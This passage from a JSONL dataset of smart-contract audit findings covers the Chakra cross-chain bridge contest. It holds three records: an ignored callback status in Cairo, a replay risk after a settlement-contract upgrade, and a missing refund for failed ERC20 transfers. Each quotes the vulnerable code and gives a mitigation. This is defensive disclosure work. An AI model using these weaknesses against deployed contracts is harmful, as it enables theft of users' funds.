== SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n```\n\n**tools_used:**\n## Tools Used\n[Shaheen's Vision](https://x.com/0x_Shaheen/status/1722664258142650806)\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L148-L161\n\n\n# Vulnerability details\n\nWhen a validator invokes `Settlement.cairo`'s `receive_cross_chain_callback()`, they will pass the `cross_chain_msg_status` as an input and base on that the msg status should be set on the source chain. Means, if the `cross_chain_msg_status` is given as `SUCCESS` then the msg status on the source chain will be set as `CrossChainTxStatus::SETTLED` and if it is not `SUCCESS` then it should simply set the status to `CrossChainTxStatus::FAILED` but in the cairo implementation, the `cross_chain_msg_status` is completely ignored:\n```cairo\n        fn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n            ///@audit-issue M cross_chain_msg_status not checked like in the solidity instance, this will always set tx_status as settled and return true and never Failed!\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n@>              tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe `tx_status` is directly set as `SETTLED`, which means it will be always get marked as `SETTLED` even when the Msg gets failed on the destination chain.\n\nAlso, as it doesn't check the `cross_chain_msg_status`, this will always burn the tokens (when the MODE is MintBurn), which is not the case when we look at the solidity instance\n```cairo\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n```\n\n## Impact\n- Wrong state update and tokens burning\n\n## Proof of Concept\nIn the solidity instance both the status is checked and tokens only get burned when the status gets marked as SETTLED:\n```solidity\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n```\n\n## Tools Used\n[Shaheen's Vision](https://x.com/0x_Shaheen/status/1722664258142650806)\n\n## Recommended Mitigation Steps\nMake sure to check the given status and mark the `tx_status` base on that.\n\n\n\n\n\n\n\n\n## Assessed type\n\nContext\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/main/cairo/handler/src/handler_erc20.cairo#L148-L161\n\n\n# Vulnerability details\n\nWhen a validator invokes `Settlement.cairo`'s `receive_cross_chain_callback()`, they will pass the `cross_chain_msg_status` as an input and base on that the msg status should be set on the source chain. Means, if the `cross_chain_msg_status` is given as `SUCCESS` then the msg status on the source chain will be set as `CrossChainTxStatus::SETTLED` and if it is not `SUCCESS` then it should simply set the status to `CrossChainTxStatus::FAILED` but in the cairo implementation, the `cross_chain_msg_status` is completely ignored:\n```cairo\n        fn receive_cross_chain_callback(ref self: ContractState, cross_chain_msg_id: felt252, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, cross_chain_msg_status: u8) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            let erc20 = IERC20MintDispatcher{contract_address: self.token_address.read()};\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n            let created_tx = self.created_tx.read(cross_chain_msg_id);\n            ///@audit-issue M cross_chain_msg_status not checked like in the solidity instance, this will always set tx_status as settled and return true and never Failed!\n            self.created_tx.write(cross_chain_msg_id, CreatedCrossChainTx{\n                tx_id: created_tx.tx_id,\n                from_chain: created_tx.from_chain,\n                to_chain: created_tx.to_chain,\n                from:created_tx.from,\n                to:created_tx.to,\n                from_token: created_tx.from_token,\n                to_token: created_tx.to_token,\n                amount: created_tx.amount,\n@>              tx_status: CrossChainTxStatus::SETTLED\n            });\n\n            return true;\n        }\n```\nThe `tx_status` is directly set as `SETTLED`, which means it will be always get marked as `SETTLED` even when the Msg gets failed on the destination chain.\n\nAlso, as it doesn't check the `cross_chain_msg_status`, this will always burn the tokens (when the MODE is MintBurn), which is not the case when we look at the solidity instance\n```cairo\n            if self.mode.read() == SettlementMode::MintBurn{\n                erc20.burn_from(get_contract_address(), self.created_tx.read(cross_chain_msg_id).amount);\n            }\n```\n\n## Impact\n- Wrong state update and tokens burning\n\n## Proof of Concept\nIn the solidity instance both the status is checked and tokens only get burned when the status gets marked as SETTLED:\n```solidity\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n        if (status == CrossChainMsgStatus.Failed) {\n            create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n```\n\n## Tools Used\n[Shaheen's Vision](https://x.com/0x_Shaheen/status/1722664258142650806)\n\n## Recommended Mitigation Steps\nMake sure to check the given status and mark the `tx_status` base on that.\n\n\n\n\n\n\n\n\n## Assessed type\n\nContext"}, "severity": "High", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "High"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-085", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 85, "page_start": null, "title": "The receive_cross_chain_msg function has potential replay attack risks.", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself and relies entirely on the checks performed by the settlement contract. If the settlement contract is updated without changes to the validators, this could lead to a risk of previously executed transactions being replayed.\n\n## Proof of Concept\nThe `settlement_address` contract can be updated by the owner.\n```rust\n        fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n            self.ownable.assert_only_owner();\n            self.settlement_address.write(new_settlement);\n        }\n```\nIf the `settlement_address` contract is updated without changes to the validators, the cross-chain messages that were executed in the original settlement contract will no longer exist in the new settlement contract.\nThis allows an attacker to replay previously executed transactions from the old settlement contract, potentially leading to financial discrepancies or chaos because the `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself.\n```rust\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            ...\n\n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n1. Make the `settlement_address` unchange.\n```diff\n-       fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n-           self.ownable.assert_only_owner();\n-           self.settlement_address.write(new_settlement);\n-       }\n```\n2. The handler stores and verifies the state of cross-chain messages.\n```diff\n    #[storage]\n    struct Storage {\n        #[substorage(v0)]\n        ownable: OwnableComponent::Storage,\n        #[substorage(v0)]\n        upgradeable: UpgradeableComponent::Storage,\n        settlement_address: ContractAddress,\n        token_address: ContractAddress,\n        created_tx: LegacyMap<felt252, CreatedCrossChainTx>,\n+       receive_tx: LegacyMap<felt252, CrossChainMsgStatus>,\n        msg_count: u256,\n        support_handler: LegacyMap<(felt252, u256), bool>,\n        mode: u8\n    }\n```\n```diff\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n+           assert(self.receive_tx.read(cross_chain_msg_id) == CrossChainMsgStatus::UNKNOW, 'tx status error');\n            ...\n\n+           self.receive_tx.wirte(cross_chain_msg_id, CrossChainMsgStatus::SUCCESS);\n            return true;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "sections": {"description_md": null, "impact_md": "## Impact\nThe `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself and relies entirely on the checks performed by the settlement contract. If the settlement contract is updated without changes to the validators, this could lead to a risk of previously executed transactions being replayed.\n", "recommendation_md": "## Recommended Mitigation Steps\n1. Make the `settlement_address` unchange.\n```diff\n-       fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n-           self.ownable.assert_only_owner();\n-           self.settlement_address.write(new_settlement);\n-       }\n```\n2. The handler stores and verifies the state of cross-chain messages.\n```diff\n    #[storage]\n    struct Storage {\n        #[substorage(v0)]\n        ownable: OwnableComponent::Storage,\n        #[substorage(v0)]\n        upgradeable: UpgradeableComponent::Storage,\n        settlement_address: ContractAddress,\n        token_address: ContractAddress,\n        created_tx: LegacyMap<felt252, CreatedCrossChainTx>,\n+       receive_tx: LegacyMap<felt252, CrossChainMsgStatus>,\n        msg_count: u256,\n        support_handler: LegacyMap<(felt252, u256), bool>,\n        mode: u8\n    }\n```\n```diff\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n+           assert(self.receive_tx.read(cross_chain_msg_id) == CrossChainMsgStatus::UNKNOW, 'tx status error');\n            ...\n\n+           self.receive_tx.wirte(cross_chain_msg_id, CrossChainMsgStatus::SUCCESS);\n            return true;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "poc_md": "## Proof of Concept\nThe `settlement_address` contract can be updated by the owner.\n```rust\n        fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n            self.ownable.assert_only_owner();\n            self.settlement_address.write(new_settlement);\n        }\n```\nIf the `settlement_address` contract is updated without changes to the validators, the cross-chain messages that were executed in the original settlement contract will no longer exist in the new settlement contract.\nThis allows an attacker to replay previously executed transactions from the old settlement contract, potentially leading to financial discrepancies or chaos because the `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself.\n```rust\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            ...\n\n            return true;\n        }\n```\n", "fix_status_md": null, "other_md": "**lines_of_code:**\n# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n**container:**\n# Vulnerability details\n\n**tools_used:**\n## Tools Used\nManual Review\n", "full_markdown_body": "https://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself and relies entirely on the checks performed by the settlement contract. If the settlement contract is updated without changes to the validators, this could lead to a risk of previously executed transactions being replayed.\n\n## Proof of Concept\nThe `settlement_address` contract can be updated by the owner.\n```rust\n        fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n            self.ownable.assert_only_owner();\n            self.settlement_address.write(new_settlement);\n        }\n```\nIf the `settlement_address` contract is updated without changes to the validators, the cross-chain messages that were executed in the original settlement contract will no longer exist in the new settlement contract.\nThis allows an attacker to replay previously executed transactions from the old settlement contract, potentially leading to financial discrepancies or chaos because the `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself.\n```rust\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            ...\n\n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n1. Make the `settlement_address` unchange.\n```diff\n-       fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n-           self.ownable.assert_only_owner();\n-           self.settlement_address.write(new_settlement);\n-       }\n```\n2. The handler stores and verifies the state of cross-chain messages.\n```diff\n    #[storage]\n    struct Storage {\n        #[substorage(v0)]\n        ownable: OwnableComponent::Storage,\n        #[substorage(v0)]\n        upgradeable: UpgradeableComponent::Storage,\n        settlement_address: ContractAddress,\n        token_address: ContractAddress,\n        created_tx: LegacyMap<felt252, CreatedCrossChainTx>,\n+       receive_tx: LegacyMap<felt252, CrossChainMsgStatus>,\n        msg_count: u256,\n        support_handler: LegacyMap<(felt252, u256), bool>,\n        mode: u8\n    }\n```\n```diff\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) &&\n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n+           assert(self.receive_tx.read(cross_chain_msg_id) == CrossChainMsgStatus::UNKNOW, 'tx status error');\n            ...\n\n+           self.receive_tx.wirte(cross_chain_msg_id, CrossChainMsgStatus::SUCCESS);\n            return true;\n        }\n```\n\n\n## Assessed type\n\nOther\n", "markdown_raw": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/d0d45ae1d26ca1b87034e67180fac07ce9642fd9/cairo/handler/src/handler_erc20.cairo#L108\n\n\n# Vulnerability details\n\n## Impact\nThe `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself and relies entirely on the checks performed by the settlement contract. If the settlement contract is updated without changes to the validators, this could lead to a risk of previously executed transactions being replayed.\n\n## Proof of Concept\nThe `settlement_address` contract can be updated by the owner.\n```rust\n        fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n            self.ownable.assert_only_owner();\n            self.settlement_address.write(new_settlement);\n        }\n```\nIf the `settlement_address` contract is updated without changes to the validators, the cross-chain messages that were executed in the original settlement contract will no longer exist in the new settlement contract. \nThis allows an attacker to replay previously executed transactions from the old settlement contract, potentially leading to financial discrepancies or chaos because the `receive_cross_chain_msg` function does not check the execution status of cross-chain messages itself.\n```rust\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n\n            ...\n            \n            return true;\n        }\n```\n## Tools Used\nManual Review\n## Recommended Mitigation Steps\n1. Make the `settlement_address` unchange.\n```diff\n-       fn upgrade_settlement(ref self:ContractState, new_settlement: ContractAddress){\n-           self.ownable.assert_only_owner();\n-           self.settlement_address.write(new_settlement);\n-       }\n```\n2. The handler stores and verifies the state of cross-chain messages.\n```diff\n    #[storage]\n    struct Storage {\n        #[substorage(v0)]\n        ownable: OwnableComponent::Storage,\n        #[substorage(v0)]\n        upgradeable: UpgradeableComponent::Storage,\n        settlement_address: ContractAddress,\n        token_address: ContractAddress,\n        created_tx: LegacyMap<felt252, CreatedCrossChainTx>,\n+       receive_tx: LegacyMap<felt252, CrossChainMsgStatus>,\n        msg_count: u256,\n        support_handler: LegacyMap<(felt252, u256), bool>,\n        mode: u8\n    }\n```\n```diff\n        fn receive_cross_chain_msg(ref self: ContractState, cross_chain_msg_id: u256, from_chain: felt252, to_chain: felt252,\n        from_handler: u256, to_handler: ContractAddress, payload: Array<u8>) -> bool{\n            assert(to_handler == get_contract_address(),'error to_handler');\n\n            assert(self.settlement_address.read() == get_caller_address(), 'not settlement');\n\n            assert(self.support_handler.read((from_chain, from_handler)) && \n                    self.support_handler.read((to_chain, contract_address_to_u256(to_handler))), 'not support handler');\n+           assert(self.receive_tx.read(cross_chain_msg_id) == CrossChainMsgStatus::UNKNOW, 'tx status error');\n            ...\n            \n+           self.receive_tx.wirte(cross_chain_msg_id, CrossChainMsgStatus::SUCCESS);\n            return true;\n        }\n```\n\n\n## Assessed type\n\nOther"}, "severity": "Medium", "difficulty": null, "type": "bug", "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/code-423n4/2024-08-chakra", "org": "code-423n4", "name": "2024-08-chakra", "commit": "abef77d95866f2fec93270491fc5abc9ab14f86d", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "github:code-423n4/2024-08-chakra-findings", "source_mtime": null, "report_extracted_at": "2025-11-19T10:34:16.759106+00:00", "report_extractor_version": "github-issues-0.1", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-19T10:34:16.773080+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": "bug", "Finding ID": null, "Target": null, "Severity_normalized": "Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-github:code-423n4/2024-08-chakra-findings-115", "doc_id": "github:code-423n4/2024-08-chakra-findings", "finding_index": 115, "page_start": null, "title": "There is no refund mechanism in `ChakraSettlement.processCrossChainCallback` or `ChakraSettlementHandler.receive_cross_chain_callback` function", "short_summary": null, "description_md": null, "full_markdown": "# Lines of code\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n\n\n# Vulnerability details\n\n## Impact\nBecause there is no refund mechanism in the `ChakraSettlement.processCrossChainCallback` or `ChakraSettlementHandler.receive_cross_chain_callback` function, when the cross-chain ERC20 settlement fails, such as due to that the source chain's handler can be removed from the whitelist for the destination chain after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller cannot get back and loses the tokens that have been transferred to the source chain's handler or burned on the source chain by such caller.\n\n## Proof of Concept\nWhen the `ChakraSettlementHandler.cross_chain_erc20_settlement` function is called to initiate a cross-chain ERC20 settlement, the function caller can check to ensure that the handler on the source chain is whitelisted on the destination chain. After such function call, the function caller has transferred tokens to the handler on the source chain under the `MintBurn`, `LockUnlock`, or `LockMint` mode or burned tokens on the source chain under the `BurnUnlock` mode.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L111-L223\n```solidity\n    function cross_chain_erc20_settlement(\n        string memory to_chain,\n        uint256 to_handler,\n        uint256 to_token,\n        uint256 to,\n        uint256 amount\n    ) external {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(to != 0, \"Invalid to address\");\n        require(to_handler != 0, \"Invalid to handler address\");\n        require(to_token != 0, \"Invalid to token address\");\n\n@>      if (mode == SettlementMode.MintBurn) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockUnlock) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.LockMint) {\n@>          _erc20_lock(msg.sender, address(this), amount);\n@>      } else if (mode == SettlementMode.BurnUnlock) {\n@>          _erc20_burn(msg.sender, amount);\n@>      }\n\n        ...\n    }\n```\n\nYet, after the corresponding cross-chain message is initiated on the source chain and before such message is received on the destination chain, it is possible that the `ChakraSettlementHandler.remove_handler` function is called on the destination chain, which removes the source chain's handler from the whitelist for the destination chain. This is beyond the control of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function caller because such function caller cannot know this in advance.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L65-L70\n```solidity\n    function remove_handler(\n        string memory chain_name,\n        uint256 handler\n    ) external onlyOwner {\n@>      handler_whitelist[chain_name][handler] = false;\n    }\n```\n\nWhen the corresponding cross-chain message is received on the destination chain, since the handler on the source chain has been changed to be not whitelisted on the destination chain, the `ChakraSettlementHandler.receive_cross_chain_msg` function would return `false`, which marks the `status` and `receive_cross_txs[txid].status` corresponding to the cross-chain message as failed in the `ChakraSettlement.receive_cross_chain_msg` function.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L300-L355\n```solidity\n    function receive_cross_chain_msg(\n        uint256 /**txid */,\n        string memory from_chain,\n        uint256 /**from_address */,\n        uint256 from_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 /**sign type */,\n        bytes calldata /**signaturs */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n@>      if (is_valid_handler(from_chain, from_handler) == false) {\n@>          return false;\n        }\n        ...\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L170-L244\n```solidity\n    function receive_cross_chain_msg(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_address,\n        uint256 from_handler,\n        address to_handler,\n        PayloadType payload_type,\n        bytes calldata payload,\n        uint8 sign_type, // validators signature type /  multisig or bls sr25519\n        bytes calldata signatures // signature array\n    ) external {\n        ...\n\n@>      bool result = ISettlementHandler(to_handler).receive_cross_chain_msg(\n            txid,\n            from_chain,\n            from_address,\n            from_handler,\n            payload_type,\n            payload,\n            sign_type,\n            signatures\n        );\n\n@>      CrossChainMsgStatus status = CrossChainMsgStatus.Failed;\n        if (result == true) {\n            status = CrossChainMsgStatus.Success;\n            receive_cross_txs[txid].status = CrossChainMsgStatus.Success;\n@>      } else {\n@>          receive_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n\n        emit CrossChainHandleResult(\n            txid,\n            status,\n            contract_chain_name,\n            from_chain,\n            address(to_handler),\n            from_handler,\n            payload_type\n        );\n    }\n```\n\nBack on the source chain, the `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` functions are then called with the failed cross-chain message's `status`. This notifies that the corresponding cross-chain ERC20 settlement has failed by marking the corresponding `create_cross_txs[txid].status` as failed in both the `ChakraSettlement` and `ChakraSettlementHandler` contracts. However, such `ChakraSettlement.processCrossChainCallback` and `ChakraSettlementHandler.receive_cross_chain_callback` function calls do not refund the caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function the tokens that were transferred to the source chain's handler or burned on the source chain by such caller.\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/settlement/contracts/ChakraSettlement.sol#L303-L331\n```solidity\n    function processCrossChainCallback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        address to_handler,\n        CrossChainMsgStatus status,\n        uint8 sign_type,\n        bytes calldata signatures\n    ) internal {\n        require(\n            create_cross_txs[txid].status == CrossChainMsgStatus.Pending,\n            \"Invalid transaction status\"\n        );\n\n        if (\n@>          ISettlementHandler(to_handler).receive_cross_chain_callback(\n                txid,\n                from_chain,\n                from_handler,\n                status,\n                sign_type,\n                signatures\n            )\n        ) {\n            create_cross_txs[txid].status = status;\n@>      } else {\n@>          create_cross_txs[txid].status = CrossChainMsgStatus.Failed;\n        }\n    }\n```\n\nhttps://github.com/code-423n4/2024-08-chakra/blob/f61c899c22492bdf5bdcb07cdb62ea9b4cd38825/solidity/handler/contracts/ChakraSettlementHandler.sol#L365-L396\n```solidity\n    function receive_cross_chain_callback(\n        uint256 txid,\n        string memory from_chain,\n        uint256 from_handler,\n        CrossChainMsgStatus status,\n        uint8 /* sign_type */, // validators signature type /  multisig or bls sr25519\n        bytes calldata /* signatures */\n    ) external onlySettlement returns (bool) {\n        //  from_handler need in whitelist\n        if (is_valid_handler(from_chain, from_handler) == false) {\n            return false;\n        }\n\n        require(\n            create_cross_txs[txid].status == CrossChainTxStatus.Pending,\n            \"invalid CrossChainTxStatus\"\n        );\n\n        if (status == CrossChainMsgStatus.Success) {\n            if (mode == SettlementMode.MintBurn) {\n                _erc20_burn(address(this), create_cross_txs[txid].amount);\n            }\n\n            create_cross_txs[txid].status = CrossChainTxStatus.Settled;\n        }\n\n@>      if (status == CrossChainMsgStatus.Failed) {\n@>          create_cross_txs[txid].status = CrossChainTxStatus.Failed;\n        }\n\n        return true;\n    }\n```\n\n## Tools Used\nManual Review\n\n## Recommended Mitigation Steps\nThe `ChakraSettlementHandler.receive_cross_chain_callback` function can be updated to transfer the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `MintBurn`, `LockUnlock`, or `LockMint` mode. If possible, such function can also be updated to mint the failed cross-chain ERC20 settlement's token amount to the corresponding caller of the `ChakraSettlementHandler.cross_chain_erc20_settlement` function under the `BurnUnlock` mode; otherwise, if the corresponding token cannot be minted by the protocol, the protocol needs to clearly communicate with its users about the inability of refunding the failed cross-chain ERC20 settlement's token amount under the `BurnUnlock` mode.\n\n\n## Assessed type\n\nContext\n", "sections": {"description_md": null, "impact_md": "## Impact\nBecause there is no refund mechanism in the `ChakraSettlement.processCrossChainCallback` or 